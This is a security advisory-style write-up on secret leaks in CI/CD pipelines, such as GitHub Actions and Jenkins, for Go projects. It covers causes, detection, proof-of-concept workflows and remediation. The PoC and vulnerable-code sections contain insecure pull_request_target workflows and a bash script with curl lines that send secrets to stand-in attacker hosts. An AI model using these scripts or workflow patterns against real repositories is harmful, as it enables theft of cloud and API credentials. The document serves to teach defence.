# **Insecure Build Pipelines (CI/CD Secrets Leak)**

## **Vulnerability Title**

Insecure Build Pipelines (CI/CD Secrets Leak)

Identifier: cicd-secrets-leak

## **Severity Rating**

The severity of Insecure Build Pipelines leading to CI/CD secrets leak is generally rated as **High🟠 to Critical🔴**.

This assessment is supported by real-world incidents and standardized scoring. For instance, a supply chain compromise involving a GitHub Action that led to secret leakage was assigned CVE-2025-30066 with a CVSS score of 8.6 (High). Secret management platforms like GitGuardian classify incidents involving critical services as "Critical" or "High" severity. Furthermore, guidance from GitHub suggests prioritizing remediation for active secrets and those leaked in public repositories, underscoring the potential for severe impact. The high potential for unauthorized access to sensitive systems and data justifies this elevated severity rating.

## **Description**

Insecure Build Pipelines (CI/CD Secrets Leak) refers to a class of vulnerabilities where sensitive information, such as API keys, passwords, tokens, private keys, and other credentials, are unintentionally exposed within or by Continuous Integration/Continuous Delivery (CI/CD) systems. This exposure can occur at various stages of the build, test, and deployment lifecycle. Rather than a single, specific flaw in a piece of software, this vulnerability is a pattern of insecure practices and configurations within the CI/CD environment.

These leaks compromise the security of applications and infrastructure, as exposed secrets can be exploited by malicious actors to gain unauthorized access, escalate privileges, steal data, or disrupt services. The OWASP Top 10 CI/CD Security Risks identify "Insufficient Credential Hygiene" (CICD-SEC-6) as a prominent risk, directly aligning with this vulnerability. The automated nature of CI/CD pipelines, while beneficial for development velocity, can amplify the impact of a secret leak if not properly secured. This vulnerability is particularly relevant for Golang projects, as with any other language, where CI/CD is used for building and deploying applications.

## **Technical Description (for security pros)**

The technical mechanisms behind CI/CD secret leaks are multifaceted, often stemming from insecure configurations, practices, or compromised components within the build pipeline. Secrets can be exposed through several vectors:

1. **Hardcoding in Configuration or Scripts:** Secrets might be directly embedded in CI/CD pipeline configuration files (e.g., YAML files for GitHub Actions, Jenkinsfiles), build scripts, or even application source code that is processed by the pipeline.
2. **Exposure in Logs:** Build processes, tests, or deployment scripts may inadvertently print secrets to standard output or error streams, which are then captured in CI/CD logs. These logs, if publicly accessible or accessible to unauthorized internal users, become a source of leakage.
    
3. **Misconfigured Tools and Integrations:** CI/CD systems often integrate with numerous third-party tools and services. Misconfigurations in these integrations or the tools themselves can lead to secret exposure.
4. **Compromised Pipeline Components:** Third-party dependencies, such as GitHub Actions or Jenkins plugins, can be compromised in supply chain attacks. A notable example is the `tj-actions/changed-files` GitHub Action (CVE-2025-30066). Attackers modified this action to include a malicious Node.js function with base64-encoded instructions. This function downloaded a Python script from a GitHub gist, which then scanned the memory of the GitHub Runner environment for secrets like passwords and API keys. The compromised action subsequently printed these discovered secrets into the GitHub Actions build logs. If these logs were public, the secrets were directly exposed.
    
5. **Insecure Storage or Transmission:** Secrets might be stored insecurely on build agents, passed insecurely between pipeline stages, or exposed in build artifacts (e.g., embedded in container images).
6. **Environment Variable Exposure:** While environment variables are a common way to pass secrets to build jobs, if not handled correctly (e.g., if they are logged or accessible through overly permissive scripts), they can be leaked.

For Golang projects, while the Go application code itself might not be the direct source of the leak, the CI/CD pipeline responsible for building, testing, and deploying the Golang application is the vulnerable component. For example, a build script for a Golang application might inadvertently log a database password, or a compromised GitHub Action used in the Golang project's workflow could exfiltrate cloud credentials. The core vulnerability often lies within the pipeline's definition, the tools it uses, or the environment in which it executes, rather than the Golang runtime or standard libraries. The `tj-actions/changed-files` incident illustrates that even actions not directly related to a specific programming language can impact any project using them, including Golang projects, by targeting the common CI/CD infrastructure.

## **Common Mistakes That Cause This**

Several common mistakes and oversights contribute significantly to the risk of CI/CD secret leaks. These errors often stem from a lack of security awareness, convenience overriding security principles, or misconfiguration of complex CI/CD systems.

- **Hardcoding Secrets:** Directly embedding credentials (API keys, passwords, tokens) into source code, configuration files (e.g., `Jenkinsfile`, GitHub Actions YAML), or build scripts is a frequent and critical error. This makes secrets easily discoverable if the code or configuration is exposed.
    
- **Insecure Storage of Secrets:** Storing secrets in plaintext in environment variables that are easily accessible or logged, or in insecure locations on build agents.
- **Excessive Permissions for Secrets:** Provisioning secrets with overly broad permissions (e.g., an API key with full administrative rights when only read access is needed) dramatically increases the potential impact if the secret is leaked. The GitGuardian "State of Secrets Sprawl 2025" report found that 96% of leaked GitHub tokens had write access.
    
- **Logging Secrets:** Build scripts, application tests, or even debugging statements can inadvertently print secrets to CI/CD logs. If these logs are not properly secured or are publicly accessible, the secrets are exposed.
    
- **Misuse of CI/CD Features:** Incorrectly using features like GitHub Actions' `pull_request_target` trigger can expose secrets. This trigger runs workflows in the context of the base repository (with access to its secrets) but can be made to check out and execute code from an untrusted fork/PR, allowing malicious code to access those secrets.

- **Vulnerable or Malicious Dependencies:** Incorporating compromised or inherently insecure third-party actions, plugins, or libraries into the CI/CD pipeline can introduce vectors for secret exfiltration. The `tj-actions/changed-files` incident is a prime example.

    
- **Ignoring Security Scan Results:** Failing to act on warnings from secret scanning tools or misinterpreting their results can leave known leaked secrets unaddressed.
- **Assuming Private Repository Security:** Developers may have a false sense of security if secrets are leaked within private repositories, believing them to be inaccessible. However, insider threats or account compromises can still lead to exposure. The "State of Secrets Sprawl 2025" report indicates that 35% of private repositories contain secrets, with AWS IAM keys being 5 times more frequent and hardcoded passwords 3 times more frequent in private repos than public ones. This practice amounts to security through obscurity, which is not a robust defense.
    
- **Lack of Secret Rotation:** Failing to regularly rotate secrets, or not having an effective process for revoking and replacing compromised secrets promptly, extends the window of opportunity for attackers.
    
- **Insufficient Credential Hygiene:** This overarching category, identified as OWASP CICD-SEC-6, encompasses many of the above points, highlighting a general lack of diligence in managing credentials securely throughout the CI/CD lifecycle.

The ease with which many of these mistakes can be made—a simple `echo` statement in a script or a misconfigured workflow trigger—underscores the necessity for defense-in-depth. This includes automated security checks, linters for pipeline configurations, robust secret management systems, and secure-by-default CI/CD platform configurations, as manual diligence alone is often insufficient to prevent these common errors.

## **Exploitation Goals**

Attackers who successfully exploit CI/CD secret leaks aim to achieve a variety of malicious objectives, leveraging the compromised credentials to gain unauthorized access and control. The primary goals include:

- **Data Theft and Espionage:** Leaked credentials can provide access to sensitive databases, storage services, and internal systems, allowing attackers to exfiltrate confidential company data, customer information, intellectual property, or source code. The New York Times source code leak was attributed to exposed credentials.
    
- **Financial Gain:**
    - **Fraudulent Transactions:** Access to financial systems or payment gateways can enable unauthorized transactions.
    - **Resource Abuse:** Compromised cloud credentials (e.g., AWS, Azure, GCP keys) are often used to provision resources for activities like cryptocurrency mining, which incurs costs for the victim organization.
        
- **Service Disruption and Sabotage:** Attackers can use leaked secrets with administrative privileges to shut down services, delete data, or otherwise disrupt business operations, leading to denial of service.
- **Software Supply Chain Compromise:** A critical goal, especially with CI/CD pipeline compromises, is to inject malicious code into the software build process. This could involve modifying Golang source code before compilation, altering build scripts, or tampering with compiled binaries and container images. The compromised software is then distributed to downstream users, broadening the attack's impact.
    
- **Persistence and Lateral Movement:** Leaked credentials can serve as an initial foothold into an organization's network. Attackers can then use this access to move laterally, discover further vulnerabilities, escalate privileges, and establish long-term persistence within the environment. The U.S. Treasury Department breach in 2024 was traced back to a leaked API key, demonstrating how a single exposed credential can lead to significant system compromise.
    
- **Reputation Damage:** Successful exploitation leading to data breaches or service disruptions can severely damage an organization's reputation and erode customer trust.
- **Competitive Advantage:** In cases of corporate espionage, attackers might seek specific intellectual property or strategic plans.

The value of leaked secrets is directly proportional to the permissions they grant and the sensitivity of the systems they protect. Even a seemingly low-privilege secret can sometimes be chained with other vulnerabilities to achieve more significant exploitation goals.

## **Affected Components or Files**

The Insecure Build Pipelines (CI/CD Secrets Leak) vulnerability can manifest in, or be caused by, a variety of components and files within the software development and deployment ecosystem. For Golang projects, while the `.go` source files are typically not where secrets should reside, the surrounding CI/CD infrastructure and processes are key areas of concern.

- **CI/CD Pipeline Configuration Files:**
    - **GitHub Actions Workflows:** YAML files (e.g., in `.github/workflows/`) defining pipeline steps, triggers, and environment variables. These are primary targets for hardcoding secrets or misconfigurations like `pull_request_target` misuse.
        
    - **Jenkinsfiles:** Groovy script files defining Jenkins pipelines. Secrets can be hardcoded as environment variables or directly in script logic if not using the Jenkins Credentials Plugin.
        
    - **Other CI/CD Platform Configurations:** Similar configuration files for GitLab CI (`.gitlab-ci.yml`), CircleCI (`config.yml`), Travis CI (`.travis.yml`), etc.
- **Build and Deployment Scripts:** Shell scripts (`.sh`), Python scripts (`.py`), Makefiles, or any custom scripts executed by the CI/CD pipeline. These scripts might handle secrets insecurely or log them. For Golang projects, this could include scripts that compile, test, package, or deploy Go applications.
- **CI/CD Logs:** Output logs generated during pipeline execution. These can inadvertently contain secrets if scripts or tools print them.
    
- **Third-Party CI/CD Components:**
    - **GitHub Actions:** Reusable units of code that can be incorporated into workflows. Compromised actions like `tj-actions/changed-files` have been shown to leak secrets.
        
    - **Jenkins Plugins:** Extensions that add functionality to Jenkins. Vulnerabilities in plugins can lead to various security issues, including potential secret exposure.
- **Containerization Files and Images:**
    - **Dockerfiles:** Instructions for building Docker images. Secrets might be mistakenly copied into image layers or exposed via `ARG` or `ENV` instructions if not handled carefully.
    - **Container Images:** Secrets can be embedded within image layers, making them accessible if the image is pulled and inspected. The "State of Secrets Sprawl 2025" report found 98% of detected secrets on DockerHub were in image layers.
        
- **Source Code (Less Common for Secrets, but Possible for Misconfigurations):** While direct hardcoding of secrets in Golang source files (`.go`) is a bad practice, configuration-related code might inadvertently expose them if not managed properly (e.g., default credentials in a sample config file committed to the repository).
- **Collaboration and Project Management Tools:** Secrets can be leaked in tools like Slack, Jira, and Confluence, especially if these tools are integrated with CI/CD notifications or workflows. 38% of incidents in these tools are classified as highly critical or urgent.
    
- **Infrastructure as Code (IaC) Files:** Templates for Terraform, CloudFormation, etc., if they contain hardcoded credentials and are processed by CI/CD.
- **Git Repositories Themselves:** The entire history of a Git repository can contain secrets if they were committed at some point, even if later removed from the current version (unless history is rewritten).

The vulnerability lies not necessarily in the Golang application code itself, but in the configurations and auxiliary files that orchestrate its build and deployment. The pipeline definitions and the scripts they execute are effectively "code" that dictates how secrets are handled, making them critical components to secure.

## **Vulnerable Code Snippet**

The "vulnerable code" in the context of CI/CD secret leaks often refers to pipeline configuration files or scripts rather than the application code (e.g., Golang code) itself. These snippets illustrate common ways secrets are mishandled in CI/CD environments.

- **Example 1: GitHub Actions - Explicit Secret Logging**
    
    ```YAML
    
    name: Vulnerable Workflow - Echo Secret
    on: [push]
    jobs:
      build:
        runs-on: ubuntu-latest
        steps:
          - name: Simulate Golang Build and Deploy
            env:
              MY_API_KEY: ${{ secrets.PRODUCTION_API_KEY }} # Secret stored in GitHub secrets
            run: |
              echo "Starting build for Golang application..."
              # go build -o myapp./...
              echo "Deploying with API Key: $MY_API_KEY" # THIS IS BAD! Prints secret to log.
              # Imagine a Golang build or deployment script here that uses MY_API_KEY
              # go build -ldflags="-X main.apiKey=$MY_API_KEY"... (if not handled carefully, this could also be an issue if the build log captures the full command with expanded variables, or if the variable isn't truly baked in and is retrievable from the binary easily)
    ```
    
    - **Explanation:** This workflow explicitly echoes the `MY_API_KEY` to the build log using an `echo` command. While a simplistic example, it represents a common pattern where debug statements, verbose script outputs, or misconfigured tools inadvertently expose secrets that are otherwise correctly sourced from a secrets store. This behavior was seen in the `tj-actions/changed-files` compromise, where the malicious action printed secrets to logs.
        
- **Example 2: GitHub Actions - `pull_request_target` Misuse (Conceptual)**
    
    ```YAML
    
    name: Pwn Request Vulnerable Workflow
    on:
      pull_request_target:
        types: [opened, synchronize]
    jobs:
      pwn_job:
        runs-on: ubuntu-latest
        steps:
          - name: Checkout PR code
            uses: actions/checkout@v4 # Assuming latest version
            with:
              ref: ${{ github.event.pull_request.head.sha }} # Checks out attacker's code from the PR
          - name: Run PR code with access to secrets
            env:
              AWS_ACCESS_KEY_ID: ${{ secrets.AWS_PROD_ACCESS_KEY_ID }}
              AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_PROD_SECRET_ACCESS_KEY }}
            run: |
              # Attacker's code from the PR can now run in this step.
              # This code has access to AWS_PROD_ACCESS_KEY_ID and AWS_PROD_SECRET_ACCESS_KEY.
              # For a Golang project, this could be a malicious build script (e.g., in a Makefile)
              # or a test script in the PR that exfiltrates these environment variables.
              echo "Attempting to exfiltrate secrets..."
              # Example: curl -X POST -d "aws_key=${AWS_ACCESS_KEY_ID}&aws_secret=${AWS_SECRET_ACCESS_KEY}" https://attacker.example.com/log
              make publish-malicious-go-binary # Assumes a Makefile target in the PR designed to steal secrets
    ```
    
    - **Explanation:** This workflow demonstrates the `pull_request_target` vulnerability. The workflow is triggered by pull requests from forks and runs in the context of the base repository, meaning it has access to the base repository's secrets (like `AWS_PROD_ACCESS_KEY_ID`). However, it checks out code directly from the pull request's head commit (`${{ github.event.pull_request.head.sha }}`). If an attacker submits a PR with malicious code (e.g., a script that reads environment variables and sends them to an external server), that malicious code will execute with access to the repository's secrets.
        
- **Example 3: Jenkinsfile - Hardcoded Secret and Log Exposure (Illustrative)**
    
    ```Groovy
    
    pipeline {
        agent any
        environment {
            // THIS IS BAD! Hardcoded secret directly in the Jenkinsfile.
            API_TOKEN = "jklmno_pqrs_this_is_a_fake_secret_token_vwxyz"
        }
        stages {
            stage('Deploy Golang App') {
                steps {
                    script {
                        // Imagine a deployment script for a Golang application
                        echo "Deploying Golang application with token: ${env.API_TOKEN}" // THIS IS ALSO BAD! Prints secret to Jenkins console log.
                        // sh "./deploy_go_app.sh --token ${env.API_TOKEN}"
                    }
                }
            }
        }
    }
    ```
    
    - **Explanation:** This Jenkinsfile hardcodes an `API_TOKEN` directly within the `environment` block. This makes the secret visible to anyone who can view the Jenkins pipeline configuration. Additionally, the `echo` statement in the deployment stage prints this token to the Jenkins console output, further exposing it. Instead, Jenkins Credentials Plugin should be used to manage and inject secrets securely.
        
These examples demonstrate that the "vulnerable code" is often configuration-as-code, where the logic flaw lies not in the Golang application being built or deployed, but in how the CI/CD pipeline itself is instructed to handle or access sensitive information. This highlights the critical need for DevSecOps practices to extend rigorous code review and security scanning processes to pipeline definitions. The simplicity with which these mistakes can be introduced (a single `echo` command, a misconfigured trigger) emphasizes the importance of automated checks, such as linters for pipeline files and secret scanning tools, alongside robust, secure-by-default secret management systems.

## **Detection Steps**

Detecting CI/CD secret leaks requires a multi-layered approach, combining automated tools with manual reviews and continuous monitoring. Given the pervasive nature of "secrets sprawl", where credentials can appear in various locations, a comprehensive detection strategy is essential.

- **Automated Secret Scanning:**
    - Implement specialized secret scanning tools (e.g., GitGuardian, GitHub Advanced Security secret scanning, TruffleHog, Gitleaks). These tools should be integrated into:
        - **Pre-commit hooks:** To catch secrets before they are committed to the repository.
        - **CI pipelines:** To scan code changes on every push or pull request.
        - **Historical scans:** To scan the entire history of existing repositories for previously missed secrets.

    - Configure scanners to detect both known patterns (e.g., API keys for specific services, private key formats) and generic or high-entropy strings that might represent custom passwords or tokens. The challenge here is that generic secrets, which constitute a large portion of leaks, are often missed by tools relying solely on simple pattern matching.
        
- **Log Analysis and Monitoring:**
    - Regularly review CI/CD build logs (e.g., GitHub Actions logs, Jenkins console output) for any inadvertently exposed secrets. This was a key vector in the `tj-actions/changed-files` incident.

    - Implement automated log monitoring and alerting for patterns resembling credentials or sensitive data.
    - Specifically for users of `tj-actions/changed-files` during its compromised period (around March 14-15, 2025), it was advised to check for "unexpected output under the changed-files section" in workflow logs.
        
- **Pipeline Configuration Review:**
    - Manually and automatically audit CI/CD configuration files (e.g., GitHub Actions YAML, Jenkinsfiles, GitLab CI YAML) for:
        - Hardcoded secrets.
        - Insecure practices like echoing secrets to logs.
        - Risky configurations, such as the misuse of GitHub Actions' `pull_request_target` trigger  or overly permissive environment variable handling in Jenkins.
            
- **Third-Party Component Auditing:**
    - Thoroughly vet any third-party actions, plugins, libraries, or tools used in the CI/CD pipeline for known vulnerabilities or suspicious behaviors.
        
    - Continuously monitor security advisories and vulnerability databases for CI/CD components.
- **Container Image Scanning:**
    - Scan Docker images and their layers for embedded secrets before they are pushed to container registries and prior to deployment. Secrets can be hidden in image layers, often unintentionally.
- **Monitor Cloud/Service Provider Logs:**
    - Review audit logs from cloud providers (AWS CloudTrail, Azure Monitor, GCP Cloud Logging) and other integrated services for unusual API calls, unexpected resource creation, or access patterns that might indicate a compromised credential originating from the CI/CD pipeline.
- **Leverage Platform-Specific Security Tools:**
    - For GitHub, utilize the secret risk assessment dashboard to gain insights into detected secrets within the organization.
    - Enable validity checks for detected credentials where supported by the platform. GitHub offers this feature, which can help prioritize active leaks.

Detection cannot be a one-off task. The dynamic nature of CI/CD pipelines and the continuous introduction of new code and configurations necessitate ongoing, automated scanning and monitoring across multiple layers—code repositories, pipeline configurations, execution logs, and build artifacts. The increasing prevalence of "generic" secrets, which are harder to detect with simple pattern matching, means that organizations may need to invest in or develop more sophisticated detection capabilities, potentially incorporating entropy analysis or machine learning, as some vendors are beginning to do. For Golang projects, this could also involve defining custom detection patterns for internal tokens or specific credential formats used by Go-based services or infrastructure.

## **Proof of Concept (PoC)**

Demonstrating a CI/CD secret leak often involves manipulating the pipeline's execution flow or its inputs/outputs to cause the exposure of a credential. These PoCs highlight how misconfigurations or vulnerabilities in the pipeline can be exploited.

- Scenario 1: Leaking a Secret via GitHub Actions Log
    
    This PoC simulates how a secret, even if correctly stored in GitHub's encrypted secrets, can be leaked into publicly viewable logs through a misconfigured workflow step. This is analogous to the behavior of the compromised tj-actions/changed-files action, which printed secrets to logs.1
    
    1. **Setup:**
        - Create a public GitHub repository (e.g., for a sample Golang project).
        - In the repository settings, navigate to "Secrets and variables" > "Actions" and add a new repository secret (e.g., `GH_TOKEN_FOR_POC` with a dummy value like `ghp_dummytoken123abc`).
    2. **Create a GitHub Actions Workflow:**
    Create a file named `.github/workflows/poc_leak.yml` with the following content:
    
        ```YAML
        
        name: PoC Secret Leak via Log
        on: [push]
        jobs:
          leak_secret_job:
            runs-on: ubuntu-latest
            steps:
              - name: Simulate Secret Usage and Leak
                env:
                  MY_IMPORTANT_TOKEN: ${{ secrets.GH_TOKEN_FOR_POC }}
                run: |
                  echo "Workflow starting..."
                  echo "Attempting to use token for a task (e.g., deploying a Golang app)..."
                  # The following line intentionally leaks the secret to the log
                  echo "Token Value: $MY_IMPORTANT_TOKEN"
                  echo "::set-output name=leaked_token::$MY_IMPORTANT_TOKEN" # Another way it might appear if used by actions
                  echo "Workflow finished."
        ```
    3. **Execution:** Commit and push this workflow file to the repository. This will trigger the workflow.
    4. **Observation:**
        - Navigate to the "Actions" tab of the GitHub repository.
        - Find the executed "PoC Secret Leak via Log" workflow run and click on it.
        - Open the `leak_secret_job` and inspect the logs for the "Simulate Secret Usage and Leak" step.
        - The output will contain the line: `Token Value: ghp_dummytoken123abc`. The secret is now exposed in the workflow log. If the repository is public, this log is publicly accessible.
- Scenario 2: Exploiting pull_request_target in GitHub Actions (Conceptual)
    
    This PoC outlines how an attacker can exploit a misconfigured pull_request_target trigger to execute their own code with access to the target repository's secrets.8
    
    1. **Target Repository Setup:**
        - A public GitHub repository (victim) has a workflow (e.g., `.github/workflows/vulnerable_pr_target.yml`) configured as follows:
            
            ```YAML
            
            name: Vulnerable PR Target Workflow
            on:
              pull_request_target:
                types: [opened, synchronize, reopened]
            jobs:
              dangerous_job:
                runs-on: ubuntu-latest
                env:
                  CRITICAL_SECRET: ${{ secrets.PRODUCTION_API_KEY }} # A sensitive secret
                steps:
                  - name: Checkout code from PR
                    uses: actions/checkout@v4
                    with:
                      repository: ${{ github.event.pull_request.head.repo.full_name }}
                      ref: ${{ github.event.pull_request.head.sha }}
                  - name: Run build script from PR
                    run: |
                      # This script is from the attacker's PR
                      # If it's a Golang project, this might be `make build` or `go test./...`
                      # which could be compromised by the attacker.
                     ./run_build_or_test.sh
            ```
            
    2. **Attacker's Actions:**
        - The attacker forks the target repository.
        - In their forked repository, the attacker creates or modifies a script (e.g., `run_build_or_test.sh`, or a `Makefile` target if the workflow runs `make`). This script is designed to exfiltrate environment variables. For a Golang project, this malicious script could be part of a test suite or a build utility.
            
            ```Bash
            
            # Attacker's malicious run_build_or_test.sh in their PR
            #!/bin/bash
            echo "Malicious script running..."
            echo "Attempting to exfiltrate CRITICAL_SECRET: $CRITICAL_SECRET"
            curl -X POST -H "Content-Type: application/json" \
                 -d "{\"secret_found\": \"$CRITICAL_SECRET\", \"repo\": \"${{ github.repository }}\"}" \
                 https://attacker-controlled-server.com/log_secrets
            echo "Exfiltration attempt complete."
            ```
            
        - The attacker commits this malicious script to their fork and creates a Pull Request to the target repository.
    3. **Execution and Observation:**
        - When the PR is opened against the target repository, the `Vulnerable PR Target Workflow` is triggered.
        - Because it uses `pull_request_target`, the workflow runs in the context of the *target repository*, thus having access to `secrets.PRODUCTION_API_KEY`.
        - The `actions/checkout` step checks out the attacker's code (containing `run_build_or_test.sh`) from the PR.
        - The `Run build script from PR` step executes the attacker's malicious script.
        - The attacker's server at `https://attacker-controlled-server.com/log_secrets` receives the `CRITICAL_SECRET`.

These PoCs demonstrate that the CI/CD pipeline itself can become an attack vector. The public nature of many CI/CD logs, especially for open-source Golang projects hosted on platforms like GitHub, significantly lowers the barrier for attackers to discover and exploit these leaks once they occur. Attackers may not need to breach the CI system directly; they can simply monitor public activity for such misconfigurations or vulnerabilities.

## **Risk Classification**

The risk associated with Insecure Build Pipelines (CI/CD Secrets Leak) is generally classified as **High to Critical**. This classification is based on the high likelihood of occurrence and the severe potential impact of such leaks.

- Likelihood: High
    
    The probability of secrets being leaked through CI/CD pipelines is considerable due to several factors:
    
    - **Common Mistakes:** Practices like hardcoding credentials, misconfiguring pipeline triggers (e.g., GitHub Actions' `pull_request_target`), and inadvertently logging secrets are prevalent.
        
    - **Secrets Sprawl:** Sensitive credentials are often dispersed across various parts of the software development lifecycle, including code repositories, configuration files, and collaboration tools. The GitGuardian "State of Secrets Sprawl 2025" report found that nearly 23.8 million new hardcoded secrets were detected in public GitHub commits during 2024, with 4.6% of all public repositories and 35% of private repositories containing at least one secret.
        
    - **Supply Chain Attacks:** CI/CD components, such as third-party GitHub Actions or Jenkins plugins, can be compromised, turning trusted tools into vectors for secret exfiltration. The `tj-actions/changed-files` incident, affecting over 23,000 repositories, exemplifies this risk.
        
    - **Complexity:** Modern CI/CD pipelines are complex systems with many moving parts and integrations, increasing the potential for misconfiguration.
- Impact: High to Critical
    
    The consequences of a CI/CD secret leak can be devastating:
    
    - **Data Breaches:** Unauthorized access to sensitive company data, customer databases, or intellectual property.
        
    - **Financial Loss:** Direct financial theft, costs associated with unauthorized resource consumption (e.g., cryptomining using leaked cloud credentials), and expenses related to incident response and recovery.
    - **Service Disruption:** Attackers can use compromised credentials to disrupt or disable critical services.
    - **Reputational Damage:** Loss of customer trust and public confidence following a breach.
    - **Full System Compromise:** Leaked administrative credentials can lead to attackers gaining complete control over servers, applications, and cloud infrastructure.
    - **Software Supply Chain Compromise:** Attackers can inject malicious code into build artifacts (e.g., Golang binaries, container images), which are then distributed to end-users, amplifying the attack's reach.
        
    - The "force multiplier" effect of CI/CD means that a single leaked secret used in an automated pipeline can grant access to deploy to multiple environments, affect numerous artifacts, or compromise a wide range of services. This is because CI/CD pipelines are designed for automation and scale, and credentials used within them often have broad permissions.
- Common Weakness Enumeration (CWE) & OWASP Categories:
    
    This vulnerability aligns with several CWEs, including:
    
    - **CWE-798:** Use of Hard-coded Credentials (if secrets are embedded directly).
    - **CWE-522:** Insufficiently Protected Credentials (a broader category encompassing insecure storage and transmission).
    - **CWE-200:** Exposure of Sensitive Information to an Unauthorized Actor (when secrets appear in logs or public artifacts).
    - **CWE-915:** Improperly Controlled Modification of Dynamically-Determined Object Attributes (relevant if pipeline variables or configurations are manipulated to leak secrets).
    It also directly maps to **OWASP CICD-SEC-6: Insufficient Credential Hygiene**.

The increasing reliance on third-party components (actions, plugins, base images) in CI/CD pipelines introduces a significant, often inadequately managed, supply chain risk. This risk directly contributes to the likelihood of secret leaks, as these external components can become vectors for exfiltration, often outside the direct control or visibility of the team managing the Golang application itself.

## **Fix & Patch Guidance**

Addressing a CI/CD secret leak requires both immediate actions to contain the damage from an exposed credential and long-term strategies to prevent future occurrences. The guidance below covers both aspects, including specific considerations for vulnerabilities in CI/CD components.

**Immediate Actions Upon Discovering a Leak:**

1. **Revoke the Leaked Secret:** This is the most critical first step. Immediately invalidate the compromised credential. This could involve:
    - Rotating API keys.
    - Deleting and recreating Personal Access Tokens (PATs).
    - Changing passwords.
    - Disabling compromised service accounts.
        
2. **Identify the Source and Scope of Exposure:**
    - Determine precisely how and where the secret was leaked (e.g., a specific line in a workflow file, a log entry, a compromised third-party action).
    - Ascertain the duration of exposure and which systems or data the secret provided access to.
3. **Remove the Secret from Exposure:**
    - **Code/Configuration:** If the secret is hardcoded or present in a configuration file, remove it. If it's in Git history, consider procedures to remove it from history (e.g., using tools like `git-filter-repo` or BFG Repo-Cleaner). However, be cautious with rewriting public history, as it can disrupt collaborators. Assume any secret committed to history is compromised, even if removed from the latest commit.
    - **Logs:** If the secret is in CI/CD logs, purge or redact the logs if the platform allows. Note that logs may have been archived or accessed before purging.
    - **Compromised Component:** If a third-party action or plugin is the source, disable or update it immediately.
        
4. **Investigate for Malicious Activity:**
    - Thoroughly examine logs and audit trails for any signs that the leaked secret was used maliciously (e.g., unauthorized logins, unusual API activity, data exfiltration, resource creation).
5. **Rotate Related Secrets:**
    - Consider rotating other secrets that might have been exposed if the attacker gained a foothold or if they reside in the same insecure location.

**Fixing Vulnerable CI/CD Components (e.g., `tj-actions/changed-files` CVE-2025-30066):**

- **Update to a Patched Version:** As soon as a patched version of the vulnerable component is available, update to it. For `tj-actions/changed-files`, users were advised to update to version 46.0.1 or later.
    
- **Review Execution Logs:** Carefully review all workflow execution logs that used the vulnerable component during the period it was known or suspected to be compromised. Look for any anomalous behavior or signs of secret exposure.
    
- **Enhance Integrity Verification:** The `tj-actions/changed-files` incident, where version tags were retroactively updated to point to malicious commits , highlighted that pinning dependencies to mutable tags (e.g., `v1`, `@latest`) might not be sufficient. For critical third-party CI/CD components:
    
    - **Pin to Specific Commit SHAs:** This provides a stronger guarantee of integrity, as commit SHAs are immutable.
    - **Verify Signatures:** Where available, verify the cryptographic signatures of third-party actions or plugins.
    This incident underscores a weakness in the trust model of mutable tags for critical dependencies and points towards a need for more robust integrity verification mechanisms for CI/CD components.

Fixing a secret leak is not merely about removing the exposed credential from view; it necessitates a comprehensive incident response process. This includes not only revocation and removal but also a thorough impact assessment and, crucially, addressing the root cause of the leak to prevent recurrence. The "State of Secrets Sprawl 2025" report finding that 70% of secrets leaked in 2022 were still active in 2024 suggests that this full lifecycle of revoke, investigate, and remediate the root cause is often not completed effectively.

## **Scope and Impact**

The scope of Insecure Build Pipelines (CI/CD Secrets Leak) is extensive, potentially affecting any Golang project, or indeed projects in any language, that leverage CI/CD for automation. The impact of such leaks can range from minor operational disruptions to catastrophic security breaches.

**Scope:**

- **Affected Projects:** Any software project, including those written in Golang, that uses CI/CD pipelines for building, testing, and deploying applications.
- **CI/CD Ecosystem Components:** The vulnerability can manifest in or affect various parts of the CI/CD ecosystem:
    - Source Code Management (SCM) systems (e.g., GitHub, GitLab, Bitbucket) where pipeline configurations are stored.
    - CI/CD servers or services (e.g., Jenkins, GitHub Actions, GitLab CI, CircleCI).
    - Build runners/agents where pipeline jobs execute.
    - Build tools, linters, and testing frameworks used within the pipeline.
    - Artifact repositories (e.g., Docker Hub, Nexus, Artifactory) where build outputs are stored.
    - Deployment targets, including cloud environments (AWS, Azure, GCP), Kubernetes clusters, and on-premises servers.
- **Types of Secrets:** A wide array of sensitive information can be leaked, including:
    - API keys for third-party services (cloud providers, SaaS applications).
    - Database credentials (usernames, passwords).
    - Private encryption keys (SSH keys, PGP keys, TLS certificates).
    - Personal Access Tokens (PATs) for SCMs or other platforms.
    - Service account credentials for cloud or internal services.
    - OAuth tokens.
        
- **Exposure Vectors:** Secrets can be exposed in publicly accessible repositories and logs, or within internal systems that may still be vulnerable to insider threats or lateral movement by attackers.
    
- **Prevalence:** Secret sprawl is a widespread issue. Reports indicate that a significant percentage of both public (4.6%) and private (35%) repositories contain secrets. Specific incidents like the compromise of the `tj-actions/changed-files` action affected over 23,000 repositories, demonstrating the potential for broad impact from a single vulnerable component.
    
**Impact:**

The consequences of a CI/CD secret leak can be severe and multifaceted:

- **Direct Financial Loss:** Attackers can use leaked credentials for fraudulent activities or to consume cloud resources (e.g., for cryptomining), leading to unexpected bills for the organization.
- **Data Breach:** Unauthorized access to and exfiltration of sensitive corporate data, customer personal identifiable information (PII), financial records, or proprietary intellectual property. This can result in significant recovery costs and loss of competitive advantage.
    
- **System Compromise and Unauthorized Access:** Leaked credentials can grant attackers varying levels of access, potentially leading to full control over critical servers, applications, and cloud infrastructure.
- **Reputational Damage:** Public disclosure of a secret leak or data breach can severely damage an organization's reputation, leading to loss of customer trust and business opportunities.
- **Legal and Regulatory Penalties:** Organizations may face substantial fines and legal action for non-compliance with data protection regulations (e.g., GDPR, CCPA, HIPAA) if sensitive data is compromised due to a secret leak.
    
- **Software Supply Chain Attacks:** One of the most critical impacts is the potential for attackers to compromise the software supply chain. By injecting malicious code into build artifacts (e.g., Golang binaries, libraries, container images) using leaked pipeline credentials, attackers can distribute malware to an organization's customers or users, turning the organization itself into a distribution vector. The SolarWinds and Codecov breaches are prominent examples of CI/CD compromises leading to widespread supply chain attacks.
    
- **Denial of Service (DoS):** Attackers could leverage compromised credentials to disrupt or disable services, impacting business operations.
- **Persistent Threat:** Leaked secrets, particularly if they are long-lived and not promptly revoked, provide attackers with a persistent means of access. The "State of Secrets Sprawl 2025" report found that 70% of secrets leaked in 2022 were still active in 2024, highlighting the long tail of risk associated with unmitigated leaks.

